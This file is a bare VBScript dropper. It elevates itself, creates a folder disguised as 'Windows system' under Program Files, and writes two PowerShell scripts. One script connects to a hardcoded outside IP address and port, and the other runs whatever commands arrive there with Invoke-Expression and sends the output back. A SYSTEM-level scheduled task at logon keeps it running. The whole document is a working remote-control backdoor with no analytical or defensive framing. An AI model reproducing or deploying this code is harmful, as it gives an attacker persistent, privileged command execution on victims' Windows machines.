If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If

Set objFSO=CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists("C:\Program Files\Windows system\socket.bat") then
WScript.Quit 1

End If

Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "cmd /c mkdir C:\""Program Files""\""Windows system""", 0

WScript.Sleep 3000

Set objFSO=CreateObject("Scripting.FileSystemObject")

outSocket="c:\Program Files\Windows system\socket.ps1"
Set objSocket = objFSO.CreateTextFile(outSocket,True)
objSocket.WriteLine "$FTPServer = '23.95.80.128';$FTPPort = '7676';$testConnection=0; $lineCounter = 0;while(1){    $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);    $tcpStream = $tcpConnection.GetStream();    $reader = New-Object System.IO.StreamReader($tcpStream);    $writer = New-Object System.IO.StreamWriter($tcpStream);    $writer.AutoFlush = $true;    $buffer = new-object System.Byte[] 1024;    $encoding = new-object System.Text.AsciiEncoding;            while ($tcpConnection.Connected) {        while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {              write-host $reader.ReadLine();             $inputCounter+=1;        }                $pathOutput = -join('C:\Program Files\Windows system\output.txt');                $output = Get-Content $pathOutput | select-object -skip $lineCounter;        if($output -ne $null){            if($output.getType().Name -eq ""String""){                $lineCounter += 1;                $writer.WriteLine($output);            }else {                $lineCounter += $output.length;                Foreach($s in $output){                    $writer.WriteLine($s);                }             }        }                                  start-sleep -Milliseconds 300;        $testConnection+=1;        if($testConnection -ge 48){            $writer.WriteLine('');            $testConnection=0;        }    };        $reader.Close();    $writer.Close();    $tcpConnection.Close();        start-sleep -Milliseconds 7000;}"
objSocket.Close

outExecutor="c:\Program Files\Windows system\executor.ps1"
Set objExecutor = objFSO.CreateTextFile(outExecutor,True)
objExecutor.WriteLine "$counterInput = 0;$lineCounter = 0;$path = -join('C:\Program Files\Windows system\input.txt');while (1) {            $input = Get-Content $path | select-object -skip $lineCounter;        if($input -ne $null){            if($input.getType().Name -eq ""String""){                $lineCounter += 1;                $output = Invoke-Expression $input;                Foreach($s in $output){                    write-host $s;                    }            }else {                $lineCounter += $input.length;                Foreach($line in $input){                                            $output = Invoke-Expression $line;                    Foreach($s in $output){                        write-host $s;                      }                                         }            }            }                                       start-sleep -Milliseconds 300;};"
objExecutor.Close

outBat="c:\Program Files\Windows system\socket.bat" 
Set objBat = objFSO.CreateTextFile(outBat,True)
objBat.WriteLine "cmd /c ""type nul > C:\""Program Files""\""Windows system""\input.txt"""
objBat.WriteLine "cmd /c ""type nul > C:\""Program Files""\""Windows system""\output.txt"""
objBat.WriteLine "start cmd /c ""powershell -exec bypass -File ""c:\Program Files\Windows system\socket.ps1"" >> c:\""Program Files""\""Windows system""\input.txt"""
objBat.WriteLine "start cmd /c ""powershell -exec bypass -File ""c:\Program Files\Windows system\executor.ps1"" >> c:\""Program Files""\""Windows system""\output.txt"""
objBat.Close


oShell.run "schtasks /create /F /ru ""SYSTEM"" /sc onlogon /tn BatSocket /rl highest /tr ""\""C:\Program Files\Windows system\socket.bat""\""", 0
oShell.run "schtasks /run /I /TN BatSocket", 0
